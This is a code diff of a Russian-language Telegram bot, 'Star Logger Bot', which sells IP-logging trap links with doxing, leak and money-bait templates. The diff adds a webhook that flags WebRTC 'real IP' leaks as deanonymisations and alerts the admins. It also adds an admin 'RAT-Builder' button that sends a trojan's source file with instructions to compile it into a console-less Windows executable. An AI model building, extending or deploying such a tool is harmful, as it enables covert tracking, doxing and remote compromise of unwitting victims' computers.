@@ -22,10 +22,8 @@ LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
 
-# --- ПОДПИСКА НА КАНАЛ ---
 CHANNEL_ID    = -1004336153105
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
-
 SUPPORT       = "@boyfrer"
 PREMIUM_PRICE = 5.0
 
@@ -43,32 +41,11 @@ def _conn():
 def db_init():
     with _conn() as c:
         c.executescript("""
-        CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER UNIQUE,
-            username TEXT,
-            is_premium INTEGER DEFAULT 0,
-            created_at TEXT
-        );
-        CREATE TABLE IF NOT EXISTS balance (
-            user_id INTEGER PRIMARY KEY,
-            amount REAL DEFAULT 0
-        );
-        CREATE TABLE IF NOT EXISTS links (
-            slug TEXT PRIMARY KEY,
-            title TEXT,
-            created_by INTEGER,
-            created_at INTEGER,
-            hits INTEGER DEFAULT 0
-        );
-        CREATE TABLE IF NOT EXISTS settings (
-            key TEXT PRIMARY KEY,
-            value TEXT
-        );
-        CREATE TABLE IF NOT EXISTS rtc_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER
-        );
+        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER UNIQUE, username TEXT, is_premium INTEGER DEFAULT 0, created_at TEXT);
+        CREATE TABLE IF NOT EXISTS balance (user_id INTEGER PRIMARY KEY, amount REAL DEFAULT 0);
+        CREATE TABLE IF NOT EXISTS links (slug TEXT PRIMARY KEY, title TEXT, created_by INTEGER, created_at INTEGER, hits INTEGER DEFAULT 0);
+        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
+        CREATE TABLE IF NOT EXISTS rtc_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER);
         """)
 
 def get_setting(key, default=None):
@@ -78,17 +55,13 @@ def get_setting(key, default=None):
 
 def set_setting(key, value):
     with _conn() as c:
-        c.execute("INSERT INTO settings (key, value) VALUES (?,?) "
-                  "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))
+        c.execute("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))
 
 def is_registered(user_id):
-    with _conn() as c:
-        return c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone() is not None
+    with _conn() as c: return c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone() is not None
 
 def register(user_id, username):
-    with _conn() as c:
-        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?,?,?)",
-                  (user_id, username, datetime.now().isoformat()))
+    with _conn() as c: c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?,?,?)", (user_id, username, datetime.now().isoformat()))
 
 def is_premium(user_id):
     with _conn() as c:
@@ -96,8 +69,7 @@ def is_premium(user_id):
         return bool(r and r["is_premium"])
 
 def set_premium(user_id):
-    with _conn() as c:
-        c.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (user_id,))
+    with _conn() as c: c.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (user_id,))
 
 def get_balance(user_id):
     with _conn() as c:
@@ -106,8 +78,7 @@ def get_balance(user_id):
 
 def add_balance(user_id, amount):
     with _conn() as c:
-        c.execute("INSERT INTO balance (user_id, amount) VALUES (?,?) "
-                  "ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?", (user_id, amount, amount))
+        c.execute("INSERT INTO balance (user_id, amount) VALUES (?,?) ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?", (user_id, amount, amount))
         return c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()["amount"]
 
 def user_counts():
@@ -118,51 +89,34 @@ def user_counts():
         return total, with_bal, premium
 
 def all_user_ids():
-    with _conn() as c:
-        return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]
+    with _conn() as c: return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]
 
 def get_all_users(limit=30):
     with _conn() as c:
-        return c.execute("""
-            SELECT u.user_id, u.username, u.created_at, u.is_premium, COALESCE(b.amount, 0) as balance
-            FROM users u
-            LEFT JOIN balance b ON u.user_id = b.user_id
-            ORDER BY u.created_at DESC LIMIT ?
-        """, (limit,)).fetchall()
+        return c.execute("SELECT u.user_id, u.username, u.created_at, u.is_premium, COALESCE(b.amount, 0) as balance FROM users u LEFT JOIN balance b ON u.user_id = b.user_id ORDER BY u.created_at DESC LIMIT ?", (limit,)).fetchall()
 
 def create_link(slug, title, created_by):
-    with _conn() as c:
-        c.execute("INSERT INTO links (slug,title,created_by,created_at) VALUES (?,?,?,?)", (slug, title, created_by, int(time.time())))
+    with _conn() as c: c.execute("INSERT INTO links (slug,title,created_by,created_at) VALUES (?,?,?,?)", (slug, title, created_by, int(time.time())))
 
 def get_user_links_count(user_id):
-    with _conn() as c:
-        return c.execute("SELECT COUNT(*) FROM links WHERE created_by=?", (user_id,)).fetchone()[0]
+    with _conn() as c: return c.execute("SELECT COUNT(*) FROM links WHERE created_by=?", (user_id,)).fetchone()[0]
 
 def get_user_links(user_id, limit=10):
-    with _conn() as c:
-        return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?", (user_id, limit)).fetchall()
+    with _conn() as c: return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?", (user_id, limit)).fetchall()
 
 def get_all_links(limit=20):
-    with _conn() as c:
-        return c.execute("""
-            SELECT l.*, u.username 
-            FROM links l
-            LEFT JOIN users u ON l.created_by = u.user_id
-            ORDER BY l.created_at DESC LIMIT ?
-        """, (limit,)).fetchall()
+    with _conn() as c: return c.execute("SELECT l.*, u.username FROM links l LEFT JOIN users u ON l.created_by = u.user_id ORDER BY l.created_at DESC LIMIT ?", (limit,)).fetchall()
 
 # ---------- UTIL ----------
 def check_sub(user_id):
     try:
-        # Проверяем ТОЛЬКО КАНАЛ
         status = bot.get_chat_member(CHANNEL_ID, user_id).status
         return status in ["member", "administrator", "creator"]
-    except Exception:
-        return False
+    except: return False
 
 def send_log(text):
     try: bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
-    except Exception: pass
+    except: pass
 
 def slug_gen(n=8):
     a = string.ascii_letters + string.digits
@@ -174,8 +128,8 @@ def make_trap_link(title, created_by, creator_username, is_prem):
     create_link(slug, title, created_by)
     q_title = urllib.parse.quote(title or "—")
     q_user = "anon" if is_prem and get_setting(f"anon_{created_by}", "0") == "1" else urllib.parse.quote(creator_username or "—")
-    url = f"{WORKER_URL}/t/{slug}?t={q_title}&u={q_user}"
-    return url, slug
+    # ДОБАВЛЕН cid (ID создателя)
+    return f"{WORKER_URL}/t/{slug}?t={q_title}&u={q_user}&cid={created_by}", slug
 
 def build_html(text, trap_url, img_url=None):
     parts = [f"<p>{text}</p>", f'<p><a href="{trap_url}">Продолжение тут</a></p>']
@@ -198,27 +152,16 @@ web_app = Flask(__name__)
 def webhook_rtc():
     data = request.json
     if not data: return jsonify({"ok": False}), 400
-    
-    ip = data.get("ip")
-    real_ip = data.get("real_ip")
-    ua = data.get("ua")
-    
-    if not real_ip or real_ip == "—" or ip == real_ip:
-        return jsonify({"ok": True})
-    
+    ip = data.get("ip"); real_ip = data.get("real_ip"); ua = data.get("ua")
+    if not real_ip or real_ip == "—" or ip == real_ip: return jsonify({"ok": True})
     with _conn() as c:
         old = c.execute("SELECT ip, ts FROM rtc_logs WHERE real_ip=? AND ip != ?", (real_ip, ip)).fetchone()
         c.execute("INSERT INTO rtc_logs (ip, real_ip, ua, ts) VALUES (?,?,?,?)", (ip, real_ip, ua, int(time.time())))
-        
         if old:
-            msg = (f"🚨 <b>ДЕАНОН!</b>\n"
-                   f"Реальный IP: <code>{real_ip}</code>\n"
-                   f"Зашел с IP: <code>{ip}</code>\n"
-                   f"Раньше заходил с: <code>{old['ip']}</code>")
+            msg = f"🚨 <b>ДЕАНОН!</b>\nРеальный IP: <code>{real_ip}</code>\nЗашел с IP: <code>{ip}</code>\nРаньше заходил с: <code>{old['ip']}</code>"
             for aid in ADMIN_IDS:
                 try: bot.send_message(aid, msg, parse_mode="HTML")
                 except: pass
-                
     return jsonify({"ok": True})
 
 def run_webhook():
@@ -232,7 +175,6 @@ def show_main_menu(uid):
     kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
     kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
     kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
-    
     prem = " 💎" if is_premium(uid) else ""
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(uid, had, f'<b>⭐️Star Logger Bot!{prem}\n=============================\n⭐️Главное меню\n=============================\n💰Баланс: {get_balance(uid):.2f}$\n🆔 ID: {uid}</b>', reply_markup=kb)
@@ -245,6 +187,7 @@ def admin_menu(chat_id):
     kb.add(types.InlineKeyboardButton("💰 Выдать баланс", callback_data='admin_give_bal'))
     kb.add(types.InlineKeyboardButton("👥 Все юзеры", callback_data='admin_users'))
     kb.add(types.InlineKeyboardButton("🔗 Все ссылки", callback_data='admin_links'))
+    kb.add(types.InlineKeyboardButton("🦠 RAT-Билдер", callback_data='admin_get_rat'))
     kb.add(types.InlineKeyboardButton("📢 Рассылка", callback_data='admin_broadcast'))
     kb.add(types.InlineKeyboardButton("📊 Статистика", callback_data='admin_stats'))
     kb.add(types.InlineKeyboardButton("📦 База данных", callback_data='admin_dump'))
@@ -259,14 +202,12 @@ def cmd_start(message):
     if not is_registered(uid):
         register(uid, username)
         send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
-        
     if not check_sub(uid) and uid not in ADMIN_IDS:
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
         kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
         bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на наш канал!</b>", reply_markup=kb)
         return
-
     show_main_menu(uid)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
@@ -281,7 +222,7 @@ def cb_check_sub(call):
 @bot.callback_query_handler(func=lambda c: c.data == 'home')
 def cb_home(call):
     try: bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception: pass
+    except: pass
     show_main_menu(call.message.chat.id)
     bot.answer_callback_query(call.id)
 
@@ -306,18 +247,16 @@ def cb_cabinet(call):
         lines.append(f"💎 Анонимные ссылки: {anon}")
     else:
         lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")
-
     kb = types.InlineKeyboardMarkup()
     if not is_premium(uid):
         kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
     else:
         kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
-        
     kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
     kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
     try:
         bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
-    except Exception:
+    except:
         bot.send_message(uid, "\n".join(lines), reply_markup=kb)
     bot.answer_callback_query(call.id)
 
@@ -349,6 +288,15 @@ def cb_buy_premium(call):
 @bot.message_handler(commands=['admin'])
 def cmd_admin(m): admin_menu(m.chat.id)
 
+@bot.callback_query_handler(func=lambda c: c.data == 'admin_get_rat' and c.from_user.id in ADMIN_IDS)
+def cb_admin_get_rat(call):
+    try:
+        with open('rat.py', 'rb') as f:
+            bot.send_document(call.message.chat.id, f, caption="🦠 RAT-исходник.\n\n<b>Как собрать .exe:</b>\n1. Установи Python на ПК.\n2. <code>pip install pyTelegramBotAPI requests Pillow pywin32 pyinstaller</code>\n3. <code>pyinstaller --onefile --noconsole rat.py</code>\n4. Готовый файл в папке <code>dist</code>.")
+    except Exception as e:
+        bot.send_message(call.message.chat.id, f"❌ Файл rat.py не найден на сервере. Положи его в корень репозитория. {e}")
+    bot.answer_callback_query(call.id)
+
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
 def cb_admin_give(call):
     bot.send_message(call.message.chat.id, "<b>⭐️ID и сумму через пробел:</b>\n<code>123456789 10</code>")
@@ -362,7 +310,7 @@ def _admin_give_step(message):
     except ValueError: return
     new_bal = add_balance(uid, amount)
     try: bot.send_message(uid, f"<b>💰Баланс пополнен на {amount:.2f}$. Текущий: {new_bal:.2f}$</b>")
-    except Exception: pass
+    except: pass
     bot.reply_to(message, f"✅ {uid} +{amount:.2f}$, теперь {new_bal:.2f}$")
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_users' and c.from_user.id in ADMIN_IDS)
@@ -391,7 +339,7 @@ def cb_admin_links(call):
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_back' and c.from_user.id in ADMIN_IDS)
 def cb_admin_back(call):
     try: bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception: pass
+    except: pass
     admin_menu(call.message.chat.id)
     bot.answer_callback_query(call.id)
 
@@ -405,7 +353,7 @@ def _admin_bc_step(message):
     ok = fail = 0
     for uid in all_user_ids():
         try: bot.send_message(uid, message.text); ok += 1
-        except Exception: fail += 1
+        except: fail += 1
     bot.reply_to(message, f"✅Отправлено: {ok}, ошибок: {fail}")
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_stats' and c.from_user.id in ADMIN_IDS)
@@ -431,7 +379,6 @@ def cb_logger(call):
     if call.from_user.id not in ADMIN_IDS and get_user_links_count(call.from_user.id) >= max_links:
         bot.answer_callback_query(call.id, f"❌ Лимит {max_links} ссылок! Купи Premium 💎 для большего.", show_alert=True)
         return
-
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
     kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
@@ -443,7 +390,7 @@ def cb_logger(call):
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(call.message.chat.id, had, caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
     try: bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception: pass
+    except: pass
     bot.answer_callback_query(call.id)
 
 TEMPLATES = {
@@ -452,7 +399,6 @@ TEMPLATES = {
     "tpl_sport_v1": "СпортОтряд V1", "tpl_sport_v2": "СпортОтряд V2", "tpl_money_v1": "Заработок V1", "tpl_money_v2": "Заработок V2",
     "tpl_priv_v1": "💎 Приватный Dox", "tpl_priv_v2": "💎 Слив базы",
 }
-
 TEXTS = {
     "tpl_dox_v1": "Данный человек {title} очень часто пиздел и разбрасывался словами. Мы решили собрать его данные в кучу и слить вам, данные приложены ниже.",
     "tpl_dox_v2": "Данная личность {title} давно сидит в сети Telegram и мешает пользователям. Данные приложены ниже в полном формате.",
@@ -473,14 +419,10 @@ TEXTS = {
 @bot.callback_query_handler(func=lambda c: c.data in ("cat_dox", "cat_bait", "cat_wanted"))
 def cb_cat(call):
     kb = types.InlineKeyboardMarkup(row_width=1)
-    if call.data == "cat_dox":
-        keys = ("tpl_dox_v1", "tpl_dox_v2", "tpl_dox_v3", "tpl_dox_v4")
-    elif call.data == "cat_bait":
-        keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
-    else:
-        keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
-    for k in keys:
-        kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
+    if call.data == "cat_dox": keys = ("tpl_dox_v1", "tpl_dox_v2", "tpl_dox_v3", "tpl_dox_v4")
+    elif call.data == "cat_bait": keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
+    else: keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
+    for k in keys: kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
     kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
     bot.answer_callback_query(call.id)
